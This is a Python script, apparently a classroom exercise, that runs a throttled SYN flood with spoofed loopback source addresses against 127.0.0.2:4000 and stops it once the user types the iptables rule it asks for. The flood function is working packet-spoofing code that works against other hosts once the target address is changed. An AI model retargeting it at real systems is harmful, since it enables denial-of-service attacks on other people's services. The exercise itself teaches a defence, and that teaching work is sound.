from scapy.all import IP, TCP, send
import threading
import time
import random
import sys

ddos_active = True

def launch_ddos_attack(target_ip, target_port):
    global ddos_active
    print(f"Launching DDoS attack on {target_ip}:{target_port}...")
    while ddos_active:
        try:
            spoofed_ip = f"127.0.0.{random.randint(1, 254)}"
            packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
            send(packet, verbose=0)
            time.sleep(0.1)
        except PermissionError:
            print("Error: Permission denied. Please run the script with sudo.")
            sys.exit(1)
        except KeyboardInterrupt:
            print("DDoS attack stopped.")
            break

def wait_for_user_defense():
    global ddos_active
    print("DDoS attack started. Defend by blocking the IP range")
    print("command: sudo iptables -A INPUT -s 127.0.0.0/24 -j DROP")
    
    while True:
        user_input = input("Enter your command: ").strip()
        if user_input == "sudo iptables -A INPUT -s 127.0.0.0/24 -j DROP":
            print("DDoS attack stopped.")
            ddos_active = False
            return True
        else:
            print("Incorrect command. Try again.")

def main():
    target_ip = "127.0.0.2"
    target_port = 4000

    ddos_thread = threading.Thread(target=launch_ddos_attack, args=(target_ip, target_port))
    ddos_thread.start()

    if wait_for_user_defense():
        ddos_thread.join()
        print("DDoS attack successfully defended.")

if __name__ == "__main__":
    main()